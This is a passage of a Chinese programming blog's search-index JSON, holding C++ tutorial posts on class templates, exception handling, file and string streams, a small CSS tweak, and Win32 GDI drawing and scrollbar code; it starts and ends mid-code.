//析构函数 Array&lt;T&gt; &amp;operator = (const Array&lt;T&gt; &amp;rhs); // 重载&quot;=&quot;使数组对象可以整体赋值 T &amp;operator [] (int i); // 重载&quot;[]&quot;，使Array对象可以起到C++普通数组的作用 const T &amp;operator [] (int i) const; // &quot;[]&quot;运算符的const版本 operator T *(); // 重载到T*类型的转换，使Array对象可以起到C++普通数组的作用 operator const T *() const; // 到T*类型转换操作符的const版本 int getSize() const; // 取数组的大小 void resize(int sz); // 修改数组的大小&#125;;// 构造函数template &lt;class T&gt;Array&lt;T&gt;::Array(int sz) &#123; assert(sz &gt;= 0); // sz为数组大小（元素个数），应当非负 size = sz; // 将元素个数赋值给变量size list = new T[size]; // 动态分配size个T类型的元素空间&#125;// 析构函数template &lt;class T&gt;Array&lt;T&gt;::~Array() &#123; delete[] list;&#125;// 拷贝构造函数template &lt;class T&gt;Array&lt;T&gt;::Array(const Array&lt;T&gt; &amp;a) &#123; // 从对象x取得数组大小，并赋值给当前对象的成员 size = a.size; // 为对象申请内存并进行出错检查 list = new T[size]; // 动态分配n个T类型的元素空间 // 从对象X复制数组元素到本对象 for (int i = 0; i &lt; size; i++) list[i] = a.list[i];&#125;// 重载&quot;=&quot;运算符，将对象rhs赋值给本对象。实现对象之间的整体赋值template &lt;class T&gt;Array&lt;T&gt; &amp;Array&lt;T&gt;::operator = (const Array&lt;T&gt; &amp;rhs) &#123; if (&amp;rhs != this) &#123; // 如果本对象中数组大小与rhs不同，则删除数组原有内存，然后重新分配 if (size != rhs.size) &#123; delete[] list; // 删除数组原有内存 size = rhs.size; // 设置本对象的数组大小 list = new T[size]; // 重新分配n个元素的内存 &#125; // 从对象X复制数组元素到本对象 for (int i = 0; i &lt; size; i++) list[i] = rhs.list[i]; &#125; return *this; // 返回当前对象的引用&#125;// 重载下标运算符，实现与普通数组一样通过下标访问元素，并且具有越界检查功能template &lt;class T&gt;T &amp;Array&lt;T&gt;::operator [] (int i) throw(out_of_range)&#123; if (i &gt;= size) throw out_of_range(&quot;Exception:out of range!&quot;); return list[i];&#125;template &lt;class T&gt;const T &amp;Array&lt;T&gt;::operator [] (int i) const throw(out_of_range)&#123; if (i &gt;= size) throw out_of_range(&quot;Exception:out of range!&quot;); return list[i];&#125;// 重载指针转换运算符，将Array类的对象名转换为T类型的指针，// 指向当前对象中的私有数组。// 因而可以象使用普通数组首地址一样使用Array类的对象名template &lt;class T&gt;Array&lt;T&gt;::operator T *() &#123; return list; // 返回当前对象中私有数组的首地址&#125;template &lt;class T&gt;Array&lt;T&gt;::operator const T *() const &#123; return list; // 返回当前对象中私有数组的首地址&#125;// 取当前数组的大小template &lt;class T&gt;int Array&lt;T&gt;::getSize() const &#123; return size;&#125;// 将数组大小修改为sztemplate &lt;class T&gt;void Array&lt;T&gt;::resize(int sz) &#123; assert(sz &gt;= 0); // 检查sz是否非负 if (sz == size) // 如果指定的大小与原有大小一样，什么也不做 return; T *newList = new T[sz]; // 申请新的数组内存 int n = (sz &lt; size) ? sz : size; // 将sz与size中较小的一个赋值给n // 将原有数组中前n个元素复制到新数组中 for (int i = 0; i &lt; n; i++) newList[i] = list[i]; delete[] list; // 删除原数组 list = newList; // 使list指向新数组 size = sz; // 更新size&#125;int main()&#123; Array&lt;int&gt; a(size_a); Array&lt;int&gt; b(size_b); cout &lt;&lt; &quot;数组a的大小为：&quot; &lt;&lt; a.getSize() &lt;&lt; endl; cout &lt;&lt; &quot;数组b的大小为：&quot; &lt;&lt; b.getSize() &lt;&lt; endl; try &#123; for (int i = 0; i &lt; size_a; ++i) a[i] = i + 1; b = a; cout &lt;&lt; &quot;数组b的大小为：&quot; &lt;&lt; b.getSize() &lt;&lt; endl; cout &lt;&lt; &quot;数组b的内容为：&quot;; for (int i = 0; i &lt; b.getSize(); ++i) cout &lt;&lt; b[i] &lt;&lt; &#x27; &#x27;; cout &lt;&lt; endl; b.resize(b.getSize() + add_size); cout &lt;&lt; &quot;扩展数组b的容量后，其大小为：&quot; &lt;&lt; b.getSize() &lt;&lt; endl; // 测试异常捕获 cout &lt;&lt; b[b.getSize()] &lt;&lt; endl; &#125; catch (out_of_range &amp;e) &#123; cout &lt;&lt; e.what() &lt;&lt; endl; &#125; return 0;&#125;","tags":"c++刷题"},{"title":"栈溢出的异常处理","url":"/post/71ad48f.html","text":"【问题描述】 下面程序定义栈类模板StackTemplate，创建栈对象存储斐波那契数列的前10项数值，并以后进先出的方式取出元素并输出，输出结果为：55 34 21 13 8 5 3 2 1 1。其中void push(const T&amp; i)函数为添加元素、T pop()函数为取出栈顶元素，int fibonacci(int n)函数为计算斐波那契数列的第n项值。在计算斐波那契数列值、添加元素和取出元素的过程中要进行上溢OverFlow或者下溢UnderFlow的异常处理。 【样例输入】 无 【样例输出】 55 34 21 13 8 5 3 2 1 1 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#include &lt;iostream&gt;#include &lt;iomanip&gt;using namespace std;// 定义枚举类型ERROR，其包含两个枚举常量UnderFlow和OverFlow，值分别默认为0和1，表示下溢和上溢enum ERROR &#123; UnderFlow, OverFlow &#125;;int fibonacci(int n);template&lt;typename T&gt;class StackTemplate &#123; enum &#123; size = 100 &#125;; T stack[size]; int top;public: StackTemplate() : top(0) &#123;&#125; void push(const T &amp;i) &#123; if (top &gt;= size) throw OverFlow; stack[top++] = i; // 先赋值再自增，栈顶指针指向的是还没有初始化的位置 &#125; T pop() &#123; if (top &lt;= 0) throw UnderFlow; return stack[--top]; // 注意这里栈顶指针应该先减再取值 &#125; int getTop() const &#123; return top; &#125;&#125;;int main()&#123; try &#123; StackTemplate&lt;int&gt; is; for (int i = 0; i &lt; 10; i++) is.push(fibonacci(i+1)); for (int k = 0; k &lt; 10; k++) cout &lt;&lt; setw(5) &lt;&lt; left &lt;&lt; is.pop(); &#125; catch (ERROR e) &#123; switch (e) &#123; case OverFlow: cout &lt;&lt; &quot;触发上溢错误！&quot; &lt;&lt; endl; exit(0); case UnderFlow: cout &lt;&lt; &quot;触发下溢错误！&quot; &lt;&lt; endl; exit(0); &#125; &#125; catch (...) // 通用捕获异常 &#123; cout &lt;&lt; &quot;未知错误！&quot; &lt;&lt; endl; exit(0); &#125; return 0;&#125;int fibonacci(int n)&#123; const int sz = 100; int i; static int f[sz]; // 注意这里应该定义为静态变量，储存之间计算出的结果 if (n &gt; sz) throw OverFlow; f[0] = f[1] = 1; for (i = 0; i &lt; sz; i++) if (f[i] == 0) break; // i &gt;= 2 // 当n==1或2时，不进入循环，返回的都是f[1](f[0] == f[1]，所以结果不影响) while (i &lt; n) &#123; f[i] = f[i - 1] + f[i - 2]; i++; &#125; return f[i - 1]; &#125;","tags":"c++刷题"},{"title":"分类页基础美化","url":"/post/1f3575f8.html","text":"在Blog根目录\\source\\css\\custom.css(缺少的文件/文件夹直接新建)新增如下样式： 12345678910111213141516171819202122/* 分类页样式 began */.category-list-link:hover&#123; transform: scale(1.1); box-shadow: 10px 10px 15px 2px rgba(0,0,0,.12), 0 0 6px 0 rgba(104, 104, 105, 0.1); border-radius: 15px; padding: 6px 16px; margin-left: 0px; font-size: 16px; transition-duration: 0.15s; //display:flex;&#125;a.category-list-link:before&#123; top: 10px; width: 18px; height: 18px; content: &quot;📚&quot;; margin-right: 5px; font: normal normal normal 14px/1 FontAwesome; font-size: 15px; line-height: 18px;&#125;/* 分类页样式 end */","tags":"博客美化"},{"title":"c++异常详解","url":"/post/3a0c5cfa.html","text":"生命周期异常在被调函数中触发，不断传向下一级主调函数，直到被捕获 ps：若异常无法被捕获，程序会调用库函数terminate，由库函数调用abort函数终止程序 关键字1. throwthrow + 表达式：抛出异常 ps：表达式可以是数据，也可以是函数(必须有返回值) 2. try + catchps：catch (...)表示通用捕获，任何异常均可捕获，但是无法获取异常的值，一般放在所有catch最后 注：catch (基类异常)可以捕获派生类异常，若基类异常和派生类异常同存，一般将基类异常的捕获放在后面 123456789101112try&#123; ...&#125;catch (exception &amp;e)&#123; ...&#125;catch (...)&#123; ...&#125; 实例除零异常分析：try块处理了三个除法(15~17行)；第二个除法除数为0，divide抛出被除数8被捕获并打印异常信息 ps：try当中抛出异常后的语句无法执行，对应第三个除法(17行) 12345678910111213141516171819202122232425#include &lt;iostream&gt;using namespace std;float divide(float x, float y)&#123; if (0 == y) throw x; return x / y;&#125;int main()&#123; try &#123; cout &lt;&lt; &quot;5 / 2 = &quot; &lt;&lt; divide(5, 2) &lt;&lt; endl; cout &lt;&lt; &quot;8 / 0 = &quot; &lt;&lt; divide(8, 0) &lt;&lt; endl; cout &lt;&lt; &quot;7 / 1 = &quot; &lt;&lt; divide(7, 1) &lt;&lt; endl; &#125; catch(float e) &#123; cout &lt;&lt; e &lt;&lt; &quot; is divided by zero!&quot; &lt;&lt; endl; &#125; return 0;&#125; 异常接口声明1void func() throw(A, B, C, D) // A, B, C, D表示可能抛出的异常类型；func()可能抛出异常，须放在try当中 1void func() throw() // 表示func()函数一定不会抛出异常 异常处理中的构造与析构基本原理从对应的try块开始到异常被抛出之间构造(且尚未析构)的所有自动对象进行析构 ps：若异常不被捕获则无法析构 实例分析：主要观察demo的析构是否被执行 异常可以被捕获： demo在退出try块之后正常析构 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;using namespace std;class MyException&#123;public: MyException(const string &amp;message) : message(message) &#123;&#125; const string &amp;getMessage() const &#123; return message; &#125;private: string message;&#125;;class Demo&#123;public: Demo() &#123; cout &lt;&lt; &quot;Constructor of Demo&quot; &lt;&lt; endl; &#125; ~Demo() &#123; cout &lt;&lt; &quot;Destructor of Demo&quot; &lt;&lt; endl; &#125;&#125;;void func() throw(MyException)&#123; Demo demo; cout &lt;&lt; &quot;Throw MyException in func()&quot; &lt;&lt; endl; throw MyException(&quot;exception thrown by func()&quot;);&#125;int main()&#123; try &#123; func(); &#125; catch(MyException &amp;e) &#123; cout &lt;&lt; e.getMessage() &lt;&lt; endl; &#125; return 0;&#125; 正常析构 异常无法被捕获： 库函数terminate调用abort函数终止程序，demo未被析构 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;using namespace std;class MyException&#123;public: MyException(const string &amp;message) : message(message) &#123;&#125; const string &amp;getMessage() const &#123; return message; &#125;private: string message;&#125;;class Demo&#123;public: Demo() &#123; cout &lt;&lt; &quot;Constructor of Demo&quot; &lt;&lt; endl; &#125; ~Demo() &#123; cout &lt;&lt; &quot;Destructor of Demo&quot; &lt;&lt; endl; &#125;&#125;;void func() throw(MyException)&#123; Demo demo; cout &lt;&lt; &quot;Throw MyException in func()&quot; &lt;&lt; endl; throw MyException(&quot;exception thrown by func()&quot;);&#125;int main()&#123; try &#123; func(); &#125; catch(int e) &#123; cout &lt;&lt; e &lt;&lt; endl; &#125; return 0;&#125; 无法析构 常见问题 异常没有被捕获导致应该自动化析构的对象没有被释放 解决方案 在所有catch最后加一个catch（...）捕获所有类型的异常 标准程序库的异常类头文件1#include &lt;stdexcept&gt; 异常类汇总 点击查看 常用异常类 exception：标准程序库异常类的公共基类 logic_error：表示可以在程序中被预先检测到的异常(这类异常可以避免) runtime_error：表示难以被预先检测到的异常 实例三角形面积计算 判断边长是否合理(为正数且满足三角不等式)，不合理抛出invalid_argument异常；合理则输出三角形面积 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;#include &lt;cmath&gt;#include &lt;stdexcept&gt;using namespace std;double area(double a, double b, double c) throw(invalid_argument)&#123; // 判断边长是否为正 if (a &lt;= 0 || b &lt;= 0 || c &lt;= 0) &#123; throw invalid_argument(&quot;The side length should be positive!&quot;); &#125; // 判断边长是否满足三角不等式 if (a + b &lt;= c || a + c &lt;= b || b + c &lt;= a) &#123; throw invalid_argument(&quot;The side length should fit the triangle inequaltion!&quot;); &#125; // 海伦公式计算面积 double aver = (a + b + c) / 2; return sqrt(aver * (aver - a) * (aver - b) * (aver - c));&#125;int main()&#123; double a, b, c, res; cout &lt;&lt; &quot;请输入三角形边长：&quot;; cin &gt;&gt; a &gt;&gt; b &gt;&gt; c; try &#123; res = area(a, b, c); &#125; catch (invalid_argument&amp; e) &#123; cout &lt;&lt; e.what() &lt;&lt; endl; return 0; &#125; cout &lt;&lt; &quot;三角形的面积为：&quot; &lt;&lt; res &lt;&lt; endl; return 0;&#125; 编写异常安全程序的原则 明确哪些操作绝对不会抛掷异常： 基本数据类型的绝大部分操作 指针的赋值 算数运算和比较运算 STL容器的swap函数 尽量确保析构函数不抛掷异常，如果必须抛掷，须在抛掷异常前完成资源释放 避免异常引发的资源泄露常见问题 函数在抛出异常以前没有释放应该由它负责释放的资源(例如用new分配的变量是不可以自动析构的，必须使用free) 解决方案 把一切动态分配的资源都包装成栈上的对象，利用抛掷异常时自动调用对象析构函数的特性来释放资源 对于必须在堆上构造的对象，可以用智能指针auto_ptr加以包装","tags":"c++语法"},{"title":"c++文件流操作","url":"/post/50f93117.html","text":"头文件12#include &lt;iostream&gt;#include &lt;fstream&gt; open()函数open() 成员函数用于打开文件 参数12void open(const char *filename, ios::openmode mode);// 第一参数指定要打开的文件的名称和位置(直接写文件名表示是在与cpp同级文件夹操作)，第二个参数定义文件被打开的模式 模式标志 描述 ios::app 追加模式。所有写入都追加到文件末尾。 ios::ate 文件打开后定位到文件末尾。 ios::in 打开文件用于读取。 ios::out 打开文件用于写入。 ios::trunc 如果该文件已经存在，其内容将在打开文件之前被截断，即把文件长度设为 0。 实例12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include &lt;fstream&gt;using namespace std;int main()&#123; string name, school; int age; ofstream fout(&quot;test.txt&quot;, ios::out | ios::trunc); // 定义文件输出对象并绑定文件名；ios::out表示向文件输出，ios::trunc表示直接覆盖文件内容，即下一次文件写入会先清空原文件内容再写入 cout &lt;&lt; &quot;姓名: &quot;; cin &gt;&gt; name; cout &lt;&lt; &quot;年龄: &quot;; cin &gt;&gt; age; cout &lt;&lt; &quot;学校: &quot;; cin &gt;&gt; school; fout &lt;&lt; name &lt;&lt; endl; fout &lt;&lt; age &lt;&lt; endl; fout &lt;&lt; school &lt;&lt; endl; cout &lt;&lt; &quot;信息已写入文件!&quot; &lt;&lt; endl; fout.close(); // 要记得关闭文件对象 ifstream fin; // 定义文件输入对象 cout &lt;&lt; &quot;\\n读取文件...&quot; &lt;&lt; endl; fin.open(&quot;test.txt&quot;, ios::in); // 以读取方式打开文件test.txt fin &gt;&gt; name; fin &gt;&gt; age; fin &gt;&gt; school; fin.close(); // 要记得关闭文件对象 cout &lt;&lt; &quot;文件内容如下：&quot; &lt;&lt; endl; cout &lt;&lt; &quot;姓名: &quot; &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; &quot;年龄: &quot; &lt;&lt; age &lt;&lt; endl; cout &lt;&lt; &quot;学校：&quot; &lt;&lt; school &lt;&lt; endl; return 0;&#125;","tags":"c++文件流"},{"title":"流操作实现字符串与数字相互转换","url":"/post/7fa1f186.html","text":"前言c++课学到的，超级实用~支持各种类型的数字与字符串之间的转换，下面以int和double类型举例 头文件12#include &lt;iostream&gt;#include &lt;sstream&gt; 模板函数数字-&gt;字符串的模板函数： 1234567template &lt;class T&gt;inline string toString(T data) // inline: 内联函数&#123; ostringstream os; // 定义字符串输出流对象存储数字 os &lt;&lt; data; return os.str();&#125; 字符串-&gt;数字的模板函数： 12345678template &lt;class T&gt;inline T toNum(const string str)&#123; T data; istringstream is(str); // 定义字符串输入流对象并存入字符串 is &gt;&gt; data; return data;&#125; 实例12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;#include &lt;sstream&gt;using namespace std;template &lt;class T&gt;inline string toString(T data)&#123; ostringstream os; os &lt;&lt; data; return os.str();&#125;template &lt;class T&gt;inline T toNum(const string str)&#123; T data; istringstream is(str); is &gt;&gt; data; return data;&#125;int main()&#123; string str, str_; double n; int m; cout &lt;&lt; &quot;请输入一个数字：&quot;; cin &gt;&gt; str; cout &lt;&lt; &quot;现在是字符串类型的我：&quot; &lt;&lt; str &lt;&lt; endl; n = toNum&lt;double&gt;(str); // 注意使用尖括号标明模板类型 cout &lt;&lt; &quot;现在是double类型的我：&quot; &lt;&lt; n &lt;&lt; endl; m = toNum&lt;int&gt;(str); cout &lt;&lt; &quot;现在是int类型的我：&quot; &lt;&lt; m &lt;&lt; endl; str_ = toString(n); // 数据传入后会自动判断数据类型所以不需要使用尖括号标注 cout &lt;&lt; &quot;现在又是字符串类型的我：&quot; &lt;&lt; str_ &lt;&lt; endl; str_ = toString(m); cout &lt;&lt; &quot;现在还是字符串类型的我：&quot; &lt;&lt; str_ &lt;&lt; endl; return 0;&#125; 测试结果","tags":"c++实用技巧"},{"title":"绘制直线","url":"/post/8c0af77f.html","text":"涉及函数(后续在函数板块补充)： SetPixel MoveToEx LineTo GetCurrentPositionEx 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; HDC hdc; PAINTSTRUCT ps; RECT rect; int i, j; POINT current_pos; TCHAR szBuffer[128]; switch (message) &#123; case WM_PAINT: hdc = BeginPaint(hwnd, &amp;ps); GetClientRect(hwnd, &amp;rect); /* 第一种：靠循环在每个点位画点 for (i = rect.left; i &lt; rect.right; ++i) SetPixel(hdc, i, 100, RGB(255, 0, 0));*/ /* 第二种：使用API函数 MoveToEx(hdc, 100, 100, NULL); LineTo(hdc, 600, 100); GetCurrentPositionEx(hdc, &amp;current_pos); // 获取当前绘点位置 StringCchPrintf(szBuffer, 128, TEXT(&quot;当前绘点位置为: (%d, %d)&quot;), current_pos.x, current_pos.y); DrawText(hdc, szBuffer, -1, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER);*/ /* 利用API函数设计网格 // 画横线 for (i = 0; i &lt;= rect.bottom; i += 50) &#123; MoveToEx(hdc, rect.left, i, NULL); LineTo(hdc, rect.right, i); &#125; // 画竖线 for (j = 0; j &lt;= rect.right; j += 50) &#123; MoveToEx(hdc, j, rect.top, NULL); LineTo(hdc, j, rect.bottom); &#125;*/ // 画五角星, emm有点丑陋 MoveToEx(hdc, 300, 100, NULL); LineTo(hdc, 200, 500); LineTo(hdc, 500, 200); LineTo(hdc, 100, 200); LineTo(hdc, 400, 500); LineTo(hdc, 300, 100); EndPaint(hwnd, &amp;ps); return 0; case WM_DESTROY: PostQuitMessage(0); // 正式关闭窗口 return 0; &#125; return DefWindowProc(hwnd, message, wParam, lParam);&#125;","tags":"winsdk程序"},{"title":"实现滚动条","url":"/post/60dff905.html","text":"头文件：sysmets.h作用：存储打印信息 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165/*----------------------------------------------- SYSMETS.H -- System metrics display structure -----------------------------------------------*/#define NUMLINES ((int) (sizeof sysmetrics / sizeof sysmetrics [0]))struct&#123; int iIndex ; TCHAR * szLabel ; TCHAR * szDesc ;&#125;sysmetrics [] =&#123; SM_CXSCREEN, TEXT (&quot;SM_CXSCREEN&quot;), TEXT (&quot;Screen width in pixels&quot;), SM_CYSCREEN, TEXT (&quot;SM_CYSCREEN&quot;), TEXT (&quot;Screen height in pixels&quot;), SM_CXVSCROLL, TEXT (&quot;SM_CXVSCROLL&quot;), TEXT (&quot;Vertical scroll width&quot;), SM_CYHSCROLL, TEXT (&quot;SM_CYHSCROLL&quot;), TEXT (&quot;Horizontal scroll height&quot;), SM_CYCAPTION, TEXT (&quot;SM_CYCAPTION&quot;), TEXT (&quot;Caption bar height&quot;), SM_CXBORDER, TEXT (&quot;SM_CXBORDER&quot;), TEXT (&quot;Window border width&quot;), SM_CYBORDER, TEXT (&quot;SM_CYBORDER&quot;), TEXT (&quot;Window border height&quot;), SM_CXFIXEDFRAME, TEXT (&quot;SM_CXFIXEDFRAME&quot;), TEXT (&quot;Dialog window frame width&quot;), SM_CYFIXEDFRAME, TEXT (&quot;SM_CYFIXEDFRAME&quot;), TEXT (&quot;Dialog window frame height&quot;), SM_CYVTHUMB, TEXT (&quot;SM_CYVTHUMB&quot;), TEXT (&quot;Vertical scroll thumb height&quot;), SM_CXHTHUMB, TEXT (&quot;SM_CXHTHUMB&quot;), TEXT (&quot;Horizontal scroll thumb width&quot;), SM_CXICON, TEXT (&quot;SM_CXICON&quot;), TEXT (&quot;Icon width&quot;), SM_CYICON, TEXT (&quot;SM_CYICON&quot;), TEXT (&quot;Icon height&quot;), SM_CXCURSOR, TEXT (&quot;SM_CXCURSOR&quot;), TEXT (&quot;Cursor width&quot;), SM_CYCURSOR, TEXT (&quot;SM_CYCURSOR&quot;), TEXT (&quot;Cursor height&quot;), SM_CYMENU, TEXT (&quot;SM_CYMENU&quot;), TEXT (&quot;Menu bar height&quot;), SM_CXFULLSCREEN, TEXT (&quot;SM_CXFULLSCREEN&quot;), TEXT (&quot;Full screen client area width&quot;), SM_CYFULLSCREEN, TEXT (&quot;SM_CYFULLSCREEN&quot;), TEXT (&quot;Full screen client area height&quot;), SM_CYKANJIWINDOW, TEXT (&quot;SM_CYKANJIWINDOW&quot;), TEXT (&quot;Kanji window height&quot;), SM_MOUSEPRESENT, TEXT (&quot;SM_MOUSEPRESENT&quot;), TEXT (&quot;Mouse present flag&quot;), SM_CYVSCROLL, TEXT (&quot;SM_CYVSCROLL&quot;), TEXT (&quot;Vertical scroll arrow height&quot;), SM_CXHSCROLL, TEXT (&quot;SM_CXHSCROLL&quot;), TEXT (&quot;Horizontal scroll arrow width&quot;), SM_DEBUG, TEXT (&quot;SM_DEBUG&quot;), TEXT (&quot;Debug version flag&quot;), SM_SWAPBUTTON, TEXT (&quot;SM_SWAPBUTTON&quot;), TEXT (&quot;Mouse buttons swapped flag&quot;), SM_CXMIN, TEXT (&quot;SM_CXMIN&quot;), TEXT (&quot;Minimum window width&quot;), SM_CYMIN, TEXT (&quot;SM_CYMIN&quot;), TEXT (&quot;Minimum window height&quot;), SM_CXSIZE, TEXT (&quot;SM_CXSIZE&quot;), TEXT (&quot;Min/Max/Close button width&quot;), SM_CYSIZE, TEXT (&quot;SM_CYSIZE&quot;), TEXT (&quot;Min/Max/Close button height&quot;), SM_CXSIZEFRAME, TEXT (&quot;SM_CXSIZEFRAME&quot;), TEXT (&quot;Window sizing frame width&quot;), SM_CYSIZEFRAME, TEXT (&quot;SM_CYSIZEFRAME&quot;), TEXT (&quot;Window sizing frame height&quot;), SM_CXMINTRACK, TEXT (&quot;SM_CXMINTRACK&quot;), TEXT (&quot;Minimum window tracking width&quot;), SM_CYMINTRACK, TEXT (&quot;SM_CYMINTRACK&quot;), TEXT (&quot;Minimum window tracking height&quot;), SM_CXDOUBLECLK, TEXT (&quot;SM_CXDOUBLECLK&quot;), TEXT (&quot;Double click x tolerance&quot;), SM_CYDOUBLECLK, TEXT (&quot;SM_CYDOUBLECLK&quot;), TEXT (&quot;Double click y tolerance&quot;), SM_CXICONSPACING, TEXT (&quot;SM_CXICONSPACING&quot;), TEXT (&quot;Horizontal icon spacing&quot;), SM_CYICONSPACING, TEXT (&quot;SM_CYICONSPACING&quot;), TEXT (&quot;Vertical icon spacing&quot;), SM_MENUDROPALIGNMENT, TEXT (&quot;SM_MENUDROPALIGNMENT&quot;), TEXT (&quot;Left or right menu drop&quot;), SM_PENWINDOWS, TEXT (&quot;SM_PENWINDOWS&quot;), TEXT (&quot;Pen extensions installed&quot;), SM_DBCSENABLED, TEXT (&quot;SM_DBCSENABLED&quot;), TEXT (&quot;Double-Byte Char Set enabled&quot;), SM_CMOUSEBUTTONS, TEXT (&quot;SM_CMOUSEBUTTONS&quot;), TEXT (&quot;Number of mouse buttons&quot;), SM_SECURE, TEXT (&quot;SM_SECURE&quot;), TEXT (&quot;Security present flag&quot;), SM_CXEDGE, TEXT (&quot;SM_CXEDGE&quot;), TEXT (&quot;3-D border width&quot;), SM_CYEDGE, TEXT (&quot;SM_CYEDGE&quot;), TEXT (&quot;3-D border height&quot;), SM_CXMINSPACING, TEXT (&quot;SM_CXMINSPACING&quot;), TEXT (&quot;Minimized window spacing width&quot;), SM_CYMINSPACING, TEXT (&quot;SM_CYMINSPACING&quot;), TEXT (&quot;Minimized window spacing height&quot;), SM_CXSMICON, TEXT (&quot;SM_CXSMICON&quot;), TEXT (&quot;Small icon width&quot;), SM_CYSMICON, TEXT (&quot;SM_CYSMICON&quot;), TEXT (&quot;Small icon height&quot;), SM_CYSMCAPTION, TEXT (&quot;SM_CYSMCAPTION&quot;), TEXT (&quot;Small caption height&quot;), SM_CXSMSIZE, TEXT (&quot;SM_CXSMSIZE&quot;), TEXT (&quot;Small caption button width&quot;), SM_CYSMSIZE, TEXT (&quot;SM_CYSMSIZE&quot;), TEXT (&quot;Small caption button height&quot;), SM_CXMENUSIZE, TEXT (&quot;SM_CXMENUSIZE&quot;), TEXT (&quot;Menu bar button width&quot;), SM_CYMENUSIZE, TEXT (&quot;SM_CYMENUSIZE&quot;), TEXT (&quot;Menu bar button height&quot;), SM_ARRANGE, TEXT (&quot;SM_ARRANGE&quot;), TEXT (&quot;How minimized windows arranged&quot;), SM_CXMINIMIZED, TEXT (&quot;SM_CXMINIMIZED&quot;), TEXT (&quot;Minimized window width&quot;), SM_CYMINIMIZED, TEXT (&quot;SM_CYMINIMIZED&quot;), TEXT (&quot;Minimized window height&quot;), SM_CXMAXTRACK, TEXT (&quot;SM_CXMAXTRACK&quot;), TEXT (&quot;Maximum draggable width&quot;), SM_CYMAXTRACK, TEXT (&quot;SM_CYMAXTRACK&quot;), TEXT (&quot;Maximum draggable height&quot;), SM_CXMAXIMIZED, TEXT (&quot;SM_CXMAXIMIZED&quot;), TEXT (&quot;Width of maximized window&quot;), SM_CYMAXIMIZED, TEXT (&quot;SM_CYMAXIMIZED&quot;), TEXT (&quot;Height of maximized window&quot;), SM_NETWORK, TEXT (&quot;SM_NETWORK&quot;), TEXT (&quot;Network present flag&quot;), SM_CLEANBOOT, TEXT (&quot;SM_CLEANBOOT&quot;), TEXT (&quot;How system was booted&quot;), SM_CXDRAG, TEXT (&quot;SM_CXDRAG&quot;), TEXT (&quot;Avoid drag x tolerance&quot;), SM_CYDRAG, TEXT (&quot;SM_CYDRAG&quot;), TEXT (&quot;Avoid drag y tolerance&quot;), SM_SHOWSOUNDS, TEXT (&quot;SM_SHOWSOUNDS&quot;), TEXT (&quot;Present sounds visually&quot;), SM_CXMENUCHECK, TEXT (&quot;SM_CXMENUCHECK&quot;), TEXT (&quot;Menu check-mark width&quot;), SM_CYMENUCHECK, TEXT (&quot;SM_CYMENUCHECK&quot;), TEXT (&quot;Menu check-mark height&quot;), SM_SLOWMACHINE, TEXT (&quot;SM_SLOWMACHINE&quot;), TEXT (&quot;Slow processor flag&quot;), SM_MIDEASTENABLED, TEXT (&quot;SM_MIDEASTENABLED&quot;), TEXT (&quot;Hebrew and Arabic enabled flag&quot;), SM_MOUSEWHEELPRESENT, TEXT (&quot;SM_MOUSEWHEELPRESENT&quot;), TEXT (&quot;Mouse wheel present flag&quot;), SM_XVIRTUALSCREEN, TEXT (&quot;SM_XVIRTUALSCREEN&quot;), TEXT (&quot;Virtual screen x origin&quot;), SM_YVIRTUALSCREEN, TEXT (&quot;SM_YVIRTUALSCREEN&quot;), TEXT (&quot;Virtual screen y origin&quot;), SM_CXVIRTUALSCREEN, TEXT (&quot;SM_CXVIRTUALSCREEN&quot;), TEXT (&quot;Virtual screen width&quot;), SM_CYVIRTUALSCREEN, TEXT (&quot;SM_CYVIRTUALSCREEN&quot;), TEXT (&quot;Virtual screen height&quot;), SM_CMONITORS, TEXT (&quot;SM_CMONITORS&quot;), TEXT (&quot;Number of monitors&quot;), SM_SAMEDISPLAYFORMAT, TEXT (&quot;SM_SAMEDISPLAYFORMAT&quot;), TEXT (&quot;Same color format flag&quot;)&#125; ; 程序文件：分析Windows 负责： 处理滚动条中的所有鼠标消息 当用户单击滚动条时，提供一种反向显示的闪烁 当用户拖动滑块时，在滚动条内移动滑块 向拥有滚动条的窗口的窗口过程发送滚动条消 代码需要负责： 初始化滚动条的范围和位置 处理传送给窗口过程的滚动条消息 更新滑块的位置 根据滚动条的变化更新客户区的内容 实现1. 使用 SetScrollRange 函数来设置滚动条的范围 ps：这里所说的范围是指滑块的位置所能移动的范围，例如一个范围是 0~100 的滚动条，那么它的滑块就有 101 个位置可以移动。 2. TextOut 函数的第三个参数决定文本显示的位置 3. 如何看待滚动条 当用户拉动滚动条向下滚动时，他们希望是看到文件中下方的内容。而我们设计程序，则是需要将文件相对于窗口向上移动。从这个角度来说，是相反的。 4. 需要系统发送 WM_PAINT 消息重绘窗口，可以使用 InvalidateRect 函数使得客户区失效 ps：使用 InvalidateRect 使客户区失效，Windows 会在应用程序的消息队列为空的时候才发送 WM_PAINT 消息，也就意味着，如果你的程序很忙，那么刷新这一操作就会有所延迟，那么客户看到的就可能是程序一卡一卡的。因此，如果你想立刻更新无效区域，则可以在调用 InvalidateRect 函数后随即调用 UpdateWindow 函数。因为如果客户区有任何一部分是无效的，UpdateWindow 函数将绕过消息队列，直接给窗口过程发一个 WM_PAINT 消息。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155#include &lt;windows.h&gt;#include &quot;strsafe.h&quot;#include &quot;sysmets.h&quot;LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);int WINAPI WinMain(HINSTANCE 